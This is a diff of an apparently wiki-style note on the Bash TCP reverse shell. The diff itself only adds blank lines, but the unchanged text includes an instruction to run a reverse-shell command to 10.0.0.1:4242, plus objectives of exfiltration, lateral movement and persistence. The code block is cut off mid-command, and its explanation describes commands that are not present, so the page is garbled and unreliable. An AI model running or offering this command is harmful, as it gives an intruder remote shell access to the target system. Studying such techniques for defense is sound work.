@@ -34,6 +34,8 @@ To establish a Bash TCP Reverse Shell Connection, the attacker must first create
 
 The business value of this technique is that it allows attackers to gain unauthorized access to systems and steal sensitive data. This can result in financial loss, reputational damage, and legal liability for the targeted organization.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
@@ -41,6 +43,8 @@ The business value of this technique is that it allows attackers to gain unautho
 1. Bash shell on the target system
 
 1. Network connectivity between the target system and the attacker's system
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ The business value of this technique is that it allows attackers to gain unautho
 
 1. Implement strong authentication mechanisms to prevent unauthorized access to systems
 
+ 
+
 ## Objectives
 
 1. Establish a reverse shell connection from a target system to an attacker's system
@@ -58,13 +64,21 @@ The business value of this technique is that it allows attackers to gain unautho
 
 1. Perform post-exploitation activities, such as data exfiltration, lateral movement, and persistence
 
+ 
+
 # Instructions
 
 1. To establish a reverse shell connection, run the following command in your terminal:
 
+ 
+
+
+
 **Code**: [[bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 0<&196;exe]]
+
+
 
 > This command creates a reverse shell connection to the IP address and port specified (10.0.0.1/4242). This allows an attacker to gain remote access to the target system. The command uses the bash shell to redirect input and output to the specified IP address and port. The '>&' operator redirects standard output to a file descriptor and '&1' redirects standard output to the same file descriptor. '0<&196' redirects standard input to file descriptor 196. 'exec 196<>/dev/tcp/10.0.0.1/4242' opens a TCP connection to the specified IP address and port using file descriptor 196. 'sh <&196 >&196 2>&196' runs a shell command with input and output redirected to file descriptor 196. Finally, '/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1' opens a new bash shell and redirects input and output to the specified IP address and port.
 
@@ -85,3 +99,5 @@ The business value of this technique is that it allows attackers to gain unautho
 - [[Bash TCP]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
